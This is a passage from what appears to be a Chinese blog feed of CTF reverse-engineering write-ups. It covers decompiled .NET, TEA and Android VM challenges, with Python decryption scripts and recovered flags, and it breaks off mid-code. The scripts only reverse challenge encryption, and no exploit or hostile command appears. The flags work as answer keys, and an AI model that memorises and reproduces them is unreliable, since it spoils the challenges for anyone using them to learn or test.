class="hljs-built_in">xmm0</span><br><span class="hljs-keyword">movups</span>  <span class="hljs-built_in">xmm0</span>, xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span> + <span class="hljs-number">16</span>]<br><span class="hljs-keyword">movups</span>  xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-number">32</span>], <span class="hljs-built_in">xmm0</span><br><span class="hljs-keyword">movups</span>  <span class="hljs-built_in">xmm0</span>, xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span> + <span class="hljs-number">32</span>]<br><span class="hljs-keyword">movups</span>  xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-number">48</span>], <span class="hljs-built_in">xmm0</span><br><span class="hljs-keyword">movups</span>  <span class="hljs-built_in">xmm0</span>, xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span> + <span class="hljs-number">48</span>]<br><span class="hljs-keyword">movups</span>  xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-number">64</span>], <span class="hljs-built_in">xmm0</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-built_in">RCX</span> is live<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-built_in">RDX</span> is live<br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [bool where<span class="hljs-number">.</span>QZoPKLYRExWdGJMn<span class="hljs-number">.</span>check1(<span class="hljs-built_in">byte</span>[], <span class="hljs-built_in">byte</span>[]) (METHOD_ENTRY)]<br><span class="hljs-built_in">RCX</span> is dead<br><span class="hljs-built_in">RDX</span> is dead<br><span class="hljs-built_in">RAX</span> is dead<br><span class="hljs-keyword">test</span>    <span class="hljs-built_in">al</span>, <span class="hljs-built_in">al</span><br><span class="hljs-keyword">je</span>      <span class="hljs-number">0x03a5</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-built_in">RCX</span> is live<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-built_in">RDX</span> is live<br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [bool where<span class="hljs-number">.</span>TYuNpWqDZfXoRJvB<span class="hljs-number">.</span>check2(<span class="hljs-built_in">byte</span>[], <span class="hljs-built_in">byte</span>[]) (METHOD_ENTRY)]<br><span class="hljs-built_in">RCX</span> is dead<br><span class="hljs-built_in">RDX</span> is dead<br><span class="hljs-keyword">test</span>    <span class="hljs-built_in">al</span>, <span class="hljs-built_in">al</span><br><span class="hljs-keyword">je</span>      <span class="hljs-number">0x03a5</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-built_in">RCX</span> is live<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-built_in">RDX</span> is live<br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [bool where<span class="hljs-number">.</span>rc4<span class="hljs-number">.</span>check3(<span class="hljs-built_in">byte</span>[], <span class="hljs-built_in">byte</span>[]) (METHOD_ENTRY)]<br><span class="hljs-built_in">RDX</span> is dead<br><span class="hljs-built_in">RSI</span> is dead<br><span class="hljs-built_in">RCX</span> is dead<br><span class="hljs-built_in">RDI</span> is dead<br><span class="hljs-keyword">test</span>    <span class="hljs-built_in">al</span>, <span class="hljs-built_in">al</span><br><span class="hljs-keyword">je</span>      <span class="hljs-number">0x03a5</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-string">&quot;Right!&quot;</span> (STRING_HANDLE)]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span>]<br><span class="hljs-built_in">RCX</span> is live<br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [void System<span class="hljs-number">.</span>Console<span class="hljs-number">.</span>WriteLine(string) (METHOD_ENTRY)]<br><span class="hljs-built_in">RCX</span> is dead<br><span class="hljs-keyword">jmp</span>     <span class="hljs-number">0x03b5</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-string">&quot;Wrong!&quot;</span> (STRING_HANDLE)]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span>]<br><span class="hljs-built_in">RCX</span> is live<br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [void System<span class="hljs-number">.</span>Console<span class="hljs-number">.</span>WriteLine(string) (METHOD_ENTRY)]<br><span class="hljs-built_in">RCX</span> is dead<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-string">&quot;Do you believe me?&quot;</span> (STRING_HANDLE)]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span>]<br><span class="hljs-built_in">RCX</span> is live<br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [void System<span class="hljs-number">.</span>Console<span class="hljs-number">.</span>WriteLine(string) (METHOD_ENTRY)]<br><span class="hljs-built_in">RCX</span> is dead<br><span class="hljs-keyword">nop</span><br><span class="hljs-keyword">add</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">32</span><br><span class="hljs-keyword">pop</span>     <span class="hljs-built_in">rbx</span><br><span class="hljs-keyword">pop</span>     <span class="hljs-built_in">rbp</span><br><span class="hljs-keyword">pop</span>     <span class="hljs-built_in">rsi</span><br><span class="hljs-keyword">pop</span>     <span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">pop</span>     <span class="hljs-built_in">r12</span><br><span class="hljs-keyword">pop</span>     <span class="hljs-built_in">r14</span><br><span class="hljs-keyword">pop</span>     <span class="hljs-built_in">r15</span><br><span class="hljs-keyword">ret</span><br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [RNG_CHK_FAIL (HELPER)]<br><span class="hljs-keyword">int3</span><br></code></pre></td></tr></table></figure><p>所以真正的加密过程是 DES -&gt; 两次异或 -&gt; AES</p><h4 id="解密-4"><a href="#解密-4" class="headerlink" title="解密"></a>解密</h4><p>exp</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES,DES<br><br>cipher = [<br><span class="hljs-number">0x96</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xdf</span>,<br><span class="hljs-number">0x03</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xdf</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xa2</span>,<br><span class="hljs-number">0xa7</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xef</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x7c</span>,<br><span class="hljs-number">0x70</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x85</span><br>]<br><br><span class="hljs-comment"># DES</span><br>key1 = <span class="hljs-string">b&#x27;Z1Y2X3W4&#x27;</span><br>iv1 = <span class="hljs-string">b&#x27;W4X3Y2Z1&#x27;</span><br><br><span class="hljs-comment"># AES</span><br>key2 = <span class="hljs-string">b&#x27;A1B2C3D4E5F6G7H8&#x27;</span><br>iv2 = <span class="hljs-string">b&#x27;H8G7F6E5D4C3B2A1&#x27;</span><br><br>xor_val = <span class="hljs-string">&#x27;r2r&#x27;</span><br><br>cipher_bytes = <span class="hljs-built_in">bytes</span>(cipher)<br>aes = AES.new(key2,AES.MODE_CBC,iv2)<br>aes_dec = aes.decrypt(cipher_bytes)<br><br>xor1 = <span class="hljs-built_in">bytearray</span>(aes_dec)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(xor1)):<br>    xor1[i] ^= <span class="hljs-built_in">ord</span>(xor_val[i % <span class="hljs-number">3</span>])<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(xor1)):<br>    xor1[i] ^= (i + <span class="hljs-number">1</span>)<br><br>des = DES.new(key1,DES.MODE_CBC,iv1)<br>flag = des.decrypt(<span class="hljs-built_in">bytes</span>(xor1))<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>所以 flag 是 <code>flag&#123;1_@m_th3_$3cr3t_h1dd3n_1n_th3_d3p7h&#125;</code></p><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="b-w"><a href="#b-w" class="headerlink" title="b&amp;w"></a>b&amp;w</h3><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>附件给了两个 exe，一个 txt，txt 里的应该就是密文<br>分别单独打开两个 exe 的话会显示等待另外一个的连接，用 ida 看了一下，题目是两个进程之间的命名管道（FIFO）通信，先开 black.exe,打开读端，再开 white.exe 打开写端，white 读取输入之后通过 <code>pipe__white_to_black</code> 发给 black 处理，black 处理完再通过 <code>pipe__black_to_white</code> 发回 white ,white 接收后打印输出</p><p>动态调试 black.exe, 搜索字符串找主要逻辑，逐步调试找到主要加密，是个 tea</p><p><img src="/../images/NPCCTF2025/bw1.png"></p><p><img src="/../images/NPCCTF2025/bw1.1.png"></p><p><img src="/../images/NPCCTF2025/bw1.2.png"></p><p>测试输入发现如果输入的数据不是 8 的倍数后面会补 0，如果是 8 的倍数的话会在最后再加上 8 个 \x00 字节；tea 的轮数也不是标准的 32 轮而是 64 轮；同时发现在进 tea 加密之前数据已经改变，观察发现是一个自反的映射,<code>&#123;&#125;</code>不做处理，字母和数字做映射处理;而且调试过程中 delta 的值也是随机生成的</p><p>输入 flag{1111111111} </p><p><img src="/../images/NPCCTF2025/bw2.png"></p><p>输入 hbmg{3333333333} </p><p><img src="/../images/NPCCTF2025/bw3.png"></p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bnf">abcdefghijklmnopqrstuvwxyz <span class="hljs-attribute">&lt;-&gt;</span> mlkjihgfedcbazyxwvutsrqpon<br>ABCDEFGHIJKLMNOPQRSTUVWXYZ <span class="hljs-attribute">&lt;-&gt;</span> MLKJIHGFEDCBAZYXWVUTSRQPON<br>1234567890 <span class="hljs-attribute">&lt;-&gt;</span> 3210987654<br></code></pre></td></tr></table></figure><h4 id="解密-5"><a href="#解密-5" class="headerlink" title="解密"></a>解密</h4><p>测试发现 delta 的值应该在 0x4831FFFF 以内，根据 hbmg 和密文的前 8 个字节 <code>0x5f6f8bf4, 0x3b31cec1</code> 爆破出 <strong>delta &#x3D; 0x48315716</strong></p><p>exp</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs py">cipher = [<span class="hljs-number">0x5f6f8bf4</span>, <span class="hljs-number">0x3b31cec1</span>, <span class="hljs-number">0xf66376bd</span>, <span class="hljs-number">0xc5ae96f0</span>, <span class="hljs-number">0xabbcd6a9</span>, <br>          <span class="hljs-number">0x9a7afc5</span>, <span class="hljs-number">0x3eca585a</span>, <span class="hljs-number">0xb5d7c589</span>, <span class="hljs-number">0x8da5b9c8</span>, <span class="hljs-number">0x241108e6</span>]<br><br>key = [<span class="hljs-number">0x00114514</span>, <span class="hljs-number">0x19198100</span>, <span class="hljs-number">0xDEADBEEF</span>, <span class="hljs-number">0x00070201</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tea_dec</span>(<span class="hljs-params">data,key</span>):<br>    delta = <span class="hljs-number">0x48315716</span><br>    v0, v1 = data<br>    k0, k1, k2, k3 = key<br>    <span class="hljs-built_in">sum</span> = (delta * <span class="hljs-number">64</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>        v1 = (v1 - (((v0 &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v0 + <span class="hljs-built_in">sum</span>) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k3))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        v0 = (v0 - (((v1 &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v1 + <span class="hljs-built_in">sum</span>) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k1))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        <span class="hljs-built_in">sum</span> = (<span class="hljs-built_in">sum</span> - delta) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> v0, v1<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">s</span>):<br>    lower_map = <span class="hljs-built_in">str</span>.maketrans(<span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>, <span class="hljs-string">&#x27;mlkjihgfedcbazyxwvutsrqpon&#x27;</span>)<br>    upper_map = <span class="hljs-built_in">str</span>.maketrans(<span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>, <span class="hljs-string">&#x27;MLKJIHGFEDCBAZYXWVUTSRQPON&#x27;</span>)<br>    digit_map = <span class="hljs-built_in">str</span>.maketrans(<span class="hljs-string">&#x27;1234567890&#x27;</span>, <span class="hljs-string">&#x27;3210987654&#x27;</span>)<br><br><br>    result = s.translate(lower_map)<br>    result = result.translate(upper_map)<br>    result = result.translate(digit_map)<br>    <br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>():<br>    dec_data = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(cipher),<span class="hljs-number">2</span>):<br>        block = [cipher[i],cipher[i+<span class="hljs-number">1</span>]]<br>        dec_block = tea_dec(block,key)<br>        dec_data.extend(dec_block)<br><br>    result = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> val <span class="hljs-keyword">in</span> dec_data:<br>        result += val.to_bytes(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;big&#x27;</span>)<br><br>    tmp =  result.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).rstrip(<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    result = change(tmp)<br><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    flag = decrypt()<br>    <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>flag 为 <code>flag&#123;Ru57_and_g0_1s_fun_T0_r3v3rs3_XD&#125;</code></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTF 2025 4th Reverse WP</title>
    <link href="/2025/08/25/NSSCTF2025/"/>
    <url>/2025/08/25/NSSCTF2025/</url>
    
    <content type="html"><![CDATA[<h3 id="checkit"><a href="#checkit" class="headerlink" title="checkit"></a>checkit</h3><h4 id="java-层"><a href="#java-层" class="headerlink" title="java 层"></a>java 层</h4><p>附件是 apk, java 层没什么东西<br>MainActivity 如下,关键在于调用了本地方法 checkInput</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test.ezre;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.EditText;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-comment">/* loaded from: classes3.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    <span class="hljs-keyword">private</span> EditText inputEditText;<br>    <span class="hljs-keyword">private</span> TextView resultTextView;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> String <span class="hljs-title function_">checkInput</span><span class="hljs-params">(String str)</span>;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.loadLibrary(<span class="hljs-string">&quot;check&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        <span class="hljs-built_in">this</span>.inputEditText = (EditText) findViewById(R.id.editTextInput);<br>        <span class="hljs-built_in">this</span>.resultTextView = (TextView) findViewById(R.id.textViewResult);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCheckClick</span><span class="hljs-params">(View view)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.inputEditText.getText().toString().trim();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> checkInput(input);<br>        <span class="hljs-built_in">this</span>.resultTextView.setText(result);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="native-层"><a href="#native-层" class="headerlink" title="native 层"></a>native 层</h4><p>导出 libcheck.so 文件<br>在 Java_com_test_ezre_MainActivity_checkInput 函数里面找到关键处 <code>exec(code, *v4)</code></p><p><img src="/../images/NSS2025/c1.png"></p><p>点进这个函数，再跳转一次后，发现是一个 vm</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">__int64 __fastcall exec(__int64 a1, unsigned __int8 *a2)<br>&#123;<br>  __int64 result; <span class="hljs-comment">// x0</span><br>  int v3; <span class="hljs-comment">// w8</span><br>  __int64 v4; <span class="hljs-comment">// x10</span><br>  int v5; <span class="hljs-comment">// w9</span><br>  int v6; <span class="hljs-comment">// [xsp+1Ch] [xbp-D4h]</span><br><br>  result = __memset_chk(byte_4CE8, 0LL, 200LL, 200LL);<br>  *((_DWORD *)a2 + <span class="hljs-number">4</span>) = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>      &#123;<br>        <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>        &#123;<br>          <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>          &#123;<br>            <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>            &#123;<br>              <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>              &#123;<br>                <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>                &#123;<br>                  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>                  &#123;<br>                    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>                    &#123;<br>                      <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>                      &#123;<br>                        <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>                        &#123;<br>                          <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>                          &#123;<br>                            <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>                            &#123;<br>                              <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>                              &#123;<br>                                <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>                                &#123;<br>                                  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>                                  &#123;<br>                                    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>                                    &#123;<br>                                      <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>                                      